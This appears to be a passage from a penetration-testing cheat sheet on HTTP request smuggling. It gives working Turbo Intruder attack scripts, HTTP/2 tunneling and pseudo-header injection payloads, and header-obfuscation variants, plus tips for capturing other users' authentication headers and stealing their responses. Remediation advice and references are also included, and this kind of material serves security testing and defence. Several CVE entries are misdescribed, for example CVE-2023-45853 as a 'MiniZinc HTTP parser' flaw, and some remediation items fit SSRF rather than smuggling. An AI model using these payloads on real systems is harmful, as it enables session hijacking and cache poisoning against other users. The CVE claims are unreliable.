### HTTP/2 Request Tunneling — Leaking Internal Headers

```
:method      POST
:path        /comment
:authority   vulnerable-website.com
content-type application/x-www-form-urlencoded
foo

bar\r\n
Content-Length: 200\r\n
\r\n
comment=
x=1
```

The back-end sees `comment=` followed by the front-end's internal headers (e.g., `X-Internal-Header: secret`), leaking them into a reflected/stored body parameter.

### HTTP/2 Request Tunneling — Non-Blind via HEAD

```
:method  HEAD
:path    /example
:authority vulnerable-website.com
foo

bar\r\n
\r\n
GET /tunnelled HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
X: x
```

The HEAD response's `Content-Length` makes the front-end over-read, leaking the tunneled response body. Balance the lengths (point HEAD at endpoints of matching length, or pad with reflected input) to avoid truncation or timeouts.

## Commands

### Turbo Intruder — CL.TE (from PortSwigger)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False, timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED)
    engine.start()
    attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''
    engine.queue(attack)
    victim = '''GET / HTTP/1.1
Host: xxx.com\n'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)

def handleResponse(req, interesting):
    table.add(req)
```

### Turbo Intruder — TE.CL

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False, timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED)
    engine.start()
    attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0
'''
    engine.queue(attack)
    victim = '''GET / HTTP/1.1
Host: xxx.com\n'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)

def handleResponse(req, interesting):
    table.add(req)
```

### H2C Smuggler Check

```bash
go run ./cmd/h2csmuggler check https://target.com/ http://localhost
```

### Turbo Intruder — Pause-Based CL.0 (single connection, 60s pause)

```python
from turbo_intruder import RequestEngine, Engine

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)
    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000)
    followUp = 'GET / HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n'
    engine.queue(followUp)

def handleResponse(req, interesting):
    table.add(req)
```

Look for a response to the smuggled prefix (e.g., a 404 to the follow-up), which confirms the pause-based desync.

## Tools

- **http-request-smuggler** — Burp extension (PortSwigger BApp Store)
- **smuggler.py** — https://github.com/defparam/smuggler
- **smuggler.py (gwen)** — https://github.com/gwen001/pentest-tools/blob/master/smuggler.py
- **http-request-smuggling** — https://github.com/anshumanpattnaik/http-request-smuggling
- **Turbo Intruder** — Burp extension for high-speed smuggling tests; supports `pauseMarker`/`pauseTime` for pause-based desync
- **Param Miner** — Burp extension for detecting hidden attack surfaces
- **h2csmuggler** — https://github.com/BishopFox/h2csmuggler (HTTP/2 cleartext upgrade smuggling)
- **h2spec** — HTTP/2 conformance testing
- **h3spec** — HTTP/3 conformance testing
- **tiscripts** — https://github.com/defparam/tiscripts (collection of smuggling scripts)
- **Burp Repeater tab groups** — "Send group in sequence (single connection)" for CL.0 and CSD confirmation over one connection
- **Burp Inspector (Request Attributes)** — switch Repeater between HTTP/1 and HTTP/2 for cross-protocol testing

## Bypass Techniques

- **Transfer-Encoding obfuscation** (TE.TE): Add spaces, tabs, `\r\n`, extra colons, or junk characters like `xchunked` to confuse one parser while the other still recognizes it.
- **Double Content-Length**: Some servers take the first value, others take the last.
- **Chunked with `Content-Length: 0`**: Force front-end to use CL while back-end uses TE.
- **Connection: keep-alive** — Required for smuggling; a `Connection: close` will terminate the socket after the first request.

### Advanced Header Obfuscation

```
Transfer-Encoding : chunked          # Space before colon
Transfer-Encoding\t: chunked         # Tab
Transfer\rEncoding: chunked          # Carriage return
Transfer\x00Encoding: chunked        # Null byte (rare)
Transfer\x0bEncoding: chunked        # Vertical tab
```

### Multiple Content-Length Variations

```
Content-Length: 10
Content-Length: 20
Content-length: 30           # Case variation
CONTENT-LENGTH: 40           # Uppercase
Content-Length : 50          # Space before colon
```

### HTTP/2 Pseudo-Header Smuggling

```
:method: POST
:path: /
:authority: target.com
:method: GET                  # Duplicate pseudo-header
content-length: 0
content-length: 50            # Duplicate content-length
```

### HTTP/2 Header-Name Injection

HTTP/2 header *names* may contain `:` and `\r\n`; after downgrade they become separate H1 headers, bypassing front-end filters:

```
# H2 header name field:
foo: bar\r\nTransfer-Encoding: chunked\r\nX: ignore
```

### Ambiguous Host (dual Host after downgrade)

Include a regular `Host` header alongside `:authority` so the downgraded request has two Host headers:

```
:method: GET
:path: /
:authority: target.com
host: attacker.com
```

### Ambiguous Path (duplicate :path)

```
:method   POST
:path     /anything
:path     /admin
:authority vulnerable-website.com
```

If access controls validate one path while routing uses the other, restricted endpoints are reachable.

### Full Request Line Injection (:method with spaces)

```
:method  GET /admin HTTP/1.1
:path    /anything
:authority vulnerable-website.com
```

### URL Prefix Injection (:scheme)

```
:method  GET
:path    /anything
:authority vulnerable-website.com
:scheme  https://evil-user.net/poison?
```

Generates `Location: https://evil-user.net/poison?://vulnerable-website.com/anything/` — useful for cache poisoning.

### Newline Injection into Pseudo-Headers

```
:method  GET
:path    /example HTTP/1.1\r\nTransfer-Encoding: chunked\r\nX: x
:authority vulnerable-website.com
```

### Transfer-Encoding Value Pollution

```
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked;q=1
Transfer-Encoding: chunked\x20\x20
Transfer-Encoding: chunked\x0d\x0a
```

### Chunk Size Manipulation

```
1\r\n
A\r\n
0\r\n
\r\n
```

## Not a Finding If

- **Back-end closes connection after each request** — `Connection: close` prevents desync.
- **Both front-end and back-end agree on the same header** — If both use CL or both use TE identically, no desync occurs.
- **HTTP/2 is used end-to-end** — HTTP/2 uses frames, not CL/TE headers; smuggling requires HTTP/1.1 or HTTP/2-to-HTTP/1.1 downgrade paths.
- **No reverse proxy or load balancer in front** — Desync requires two distinct HTTP stacks.
- **HTTP/3 with no HTTP/1.1 translation path** — Pure HTTP/3 end-to-end eliminates CL/TE header conflicts.
- **WebSocket proxy with strict upgrade validation** — Some proxies validate the full WebSocket handshake and reject smuggled content.
- **Single Content-Length and no Transfer-Encoding** — Without conflicting headers, CL.TE or TE.CL cannot occur.
- **H2C upgrade disabled at edge** — Without h2c upgrade support, H2C smuggling is not possible.
- **General network latency or server-side processing delays unrelated to smuggling** — Timing noise can mimic desync; confirm with a unique marker string.
- **Server consistently closes connection after first request** — No connection reuse means no socket sharing, making desync impossible regardless of headers.
- **HTTP/2 with full end-to-end HTTP/2 to back-end** — No HTTP/1.1 downgrade means no desync surface.
- **WAF or proxy normalizes TE/CL headers before forwarding** — Removes the ambiguity entirely.
- **CSD requires HTTP/1.1 to the client** — No desync if the client↔server hop is HTTP/2 end-to-end (no connection reuse in the same way).
- **CL.0 requires the back-end to ignore Content-Length** — If the back-end honors `Content-Length`, a POST body is consumed and no CL.0 desync occurs.
- **H2 request splitting/tunneling requires a downgrading front-end** — Pure end-to-end HTTP/2 with no HTTP/1 translation eliminates the header-to-request-line confusion.
- **Response queue poisoning requires connection reuse and a complete smuggled request** — If the connection is closed after each cycle, or only a prefix is smuggled, responses cannot be queued/redirected.

## Remediation Recommendations

### Input Validation

- Implement strict URL validation
- Use allowlists for domains and IP ranges
- Validate URL schemes/protocols
- Implement rate limiting
- Apply layered allow-lists: validate scheme, network range, and domain in that order

### Network Controls

- Segment internal networks
- Use egress filtering
- Implement proper firewall rules
- Disable unused URL schemes
- Block h2c upgrade paths at edge proxies
- Terminate user-supplied fetches in a sandboxed egress proxy

### Application Design

- Use HTTP/2 end-to-end to eliminate CL/TE conflicts
- Ensure consistent header parsing between front-end and back-end servers
- Normalize `Transfer-Encoding` headers across all proxies before forwarding
- Reject requests with duplicate `Content-Length` headers
- Validate WebSocket upgrade handshakes strictly
- Set appropriate maximum header sizes consistently across all servers
- Strictly strip or block `transfer-encoding: chunked` in HTTP/2 requests before downgrading (prevents H2.TE)
- Validate that any `content-length` in an HTTP/2 request matches the implicit frame-derived length before downgrading (prevents H2.CL)
- Reject or sanitize `\r\n` and `:` in HTTP/2 header names and values, and control characters in `:method`/`:path`/`:scheme`/`:authority` (prevents H2 splitting, tunneling, and pseudo-header injection)
- Validate `Host`/`:authority` consistency and reject duplicate `Host` or `:path` pseudo-headers
- Always consume the request body before responding, even on error paths (prevents CL.0 and CSD)
- Never trust client-supplied auth headers added by a front-end — treat `X-SSL-CLIENT-CN`-style headers as attacker-controlled at the back-end boundary
- Close backend connections after errors/timeouts rather than reusing a desynced socket
- Limit connection reuse cycles so response queue poisoning cannot run indefinitely

## Notes

- Always use `Connection: keep-alive` on the attack request.
- Attack and victim requests must be on different TCP connections.
- The `Content-Length` of the embedded request controls how many bytes of the next request are appended — start small and increase.
- Cache poisoning via smuggling can achieve persistent XSS against all visitors.
- Cache deception lets attackers steal victim-specific private data from the cache.
- On-site redirect → open redirect is an easy win: find any path that returns a 301 using the `Host` header.
- HTTP/2 downgrade desyncs (H2.CL/H2.TE) are increasingly common as more sites adopt HTTP/2 but proxy to HTTP/1 backends.
- Client-side desync (CSD) is powerful for attacking single users without requiring shared infrastructure.
- H2C smuggling can bypass WAFs that inspect HTTP/1 but not HTTP/2 upgrade traffic.
- CL.0 requires no header tampering — any endpoint that ignores `Content-Length` (POST-to-GET endpoints, redirects, static handlers) is a candidate.
- HTTP/2 request splitting/tunneling works even when CL/TE smuggling fails because it attacks the downgrade itself, not body-length parsing.
- Response queue poisoning gives the attacker responses intended for *other* users — typically more severe than standard request capture.

### Pro Tips

- Use Burp Suite's HTTP Request Smuggler extension as a rapid scanner, but always confirm manually — false positives are common
- TE obfuscation is the most reliable path; `Transfer-Encoding: xchunked` works on many Apache/IIS back-ends
- Keep smuggled prefixes short during detection; use the minimal body to confirm desync before attempting capture attacks
- H2.CL is the most impactful modern variant — many CDNs translate HTTP/2 to HTTP/1.1 and derive Content-Length from the `content-length` regular header sent in the HTTP/2 request (not a pseudo-header — inject it as a normal header field)
- In capture attacks, set Content-Length in the smuggled prefix larger than your partial body by 50–100 bytes to catch a full auth header from the next user
- Test during low-traffic periods first to avoid affecting real users; always get explicit authorization for capture attempts
- If timing probes are inconsistent, pipeline two requests over the same connection and look for unexpected response swapping
- Burp Suite defaults to HTTP/2 over TLS — manually switch to HTTP/1 in Repeater (Request Attributes in the Inspector panel) for CL/TE testing; switch back to H2 to test H2-only vectors
- When capturing other users' requests, the captured data ends at the first parameter delimiter (`&` for URL-encoded forms) — put the capture parameter last and tune `Content-Length` incrementally to avoid timeouts
- To avoid duplicate-header errors when victim headers get appended to a smuggled prefix, add a trailing parameter and set the smuggled request's Content-Length slightly longer than the body so the victim's request is truncated before its headers
- For response queue poisoning, always use a non-existent path in your own requests — consistent 404s make stolen responses stand out
- When leaking internal headers via H2 tunneling, the parameter must be last in the body and the front-end must append its internal headers after it
- In non-blind HEAD tunneling, if the resource is too short you get truncation; too long and you time out — tune by switching endpoints or injecting reflected padding
- Use `mode: 'cors'` in fetch() for CSD when the target follows redirects you want to prevent, `no-cors` otherwise

### Real-World CVEs

- **CVE-2020-11724** — Varnish Cache HTTP/2 desync: HTTP/2 to HTTP/1.1 downgrade desync enabling cache poisoning
- **CVE-2021-41773** — Apache HTTP Server path traversal: could be chained with request smuggling
- **CVE-2022-31629** — PHP HTTP response splitting: enabling smuggling attacks with XSS and cache poisoning
- **CVE-2023-38545** — curl SOCKS5 heap overflow: connection reuse enabling smuggling in certain configurations
- **CVE-2023-45853** — MiniZinc HTTP parser: request smuggling via Transfer-Encoding handling leading to RCE

## References

- https://portswigger.net/web-security/request-smuggling
- https://portswigger.net/web-security/request-smuggling/finding
- https://portswigger.net/web-security/request-smuggling/exploiting
- https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4
- https://github.com/PortSwigger/http-request-smuggler
- https://github.com/defparam/smuggler
- https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html
- https://hipotermia.pw/bb/http-desync-idor
- https://hipotermia.pw/bb/http-desync-account-takeover
- https://0xn1ghtm4r3.notion.site/HTTP-Request-Smuggling-80b65c49d79c4ee18d2a3fbba11de64a
- https://portswigger.net/research/browser-powered-desync-attacks
- https://portswigger.net/research/http2-request-tunnelling
